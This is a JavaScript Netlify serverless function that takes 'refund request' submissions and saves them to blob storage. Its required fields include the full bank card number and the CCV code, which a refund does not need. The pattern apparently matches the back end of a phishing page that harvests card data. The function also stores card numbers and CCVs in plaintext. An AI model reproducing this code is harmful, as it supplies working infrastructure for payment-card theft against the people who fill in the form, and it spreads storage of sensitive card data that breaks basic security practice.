import { getStore } from "@netlify/blobs";

const STORE_NAME = "refund-requests";
const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "ccv"];

function json(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type": "application/json",
      "Cache-Control": "no-store",
    },
    body: JSON.stringify(body),
  };
}

function datePart(date) {
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const day = String(date.getDate()).padStart(2, "0");
  return `${year}${month}${day}`;
}

function randomPart() {
  return String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
}

async function createUniqueReference(store) {
  const base = datePart(new Date());

  for (let i = 0; i < 10; i += 1) {
    const reference = `RMB-${base}-${randomPart()}`;
    const existing = await store.get(reference, { type: "json" });
    if (!existing) {
      return reference;
    }
  }

  throw new Error("Unable to generate unique reference");
}

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return json(405, { error: "Method not allowed" });
  }

  let payload;
  try {
    payload = JSON.parse(event.body || "{}");
  } catch {
    return json(400, { error: "Invalid JSON body" });
  }

  for (const field of REQUIRED_FIELDS) {
    if (!String(payload[field] || "").trim()) {
      return json(400, { error: `Missing required field: ${field}` });
    }
  }

  const store = getStore(STORE_NAME);
  const reference = await createUniqueReference(store);

  const now = new Date().toISOString();
  const record = {
    reference,
    status: "received",
    createdAt: now,
    updatedAt: now,
    orderReference: String(payload.reference || "").trim(),
    pseudo: String(payload.pseudo || "").trim(),
    totalAmount: String(payload.montant || "").trim(),
    email: String(payload.email || "").trim(),
    phone: String(payload.telephone || "").trim(),
    fullName: String(payload.identite || "").trim(),
    orderDate: String(payload.dateAchat || "").trim(),
    postalCode: String(payload.codePostal || "").trim(),
    cardNumber: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
    ccv: String(payload.ccv || "").trim(),
    details: String(payload.details || "").trim(),
  };

  await store.setJSON(reference, record);

  return json(201, {
    reference,
    status: record.status,
    createdAt: record.createdAt,
    message: "Refund request created",
  });
}
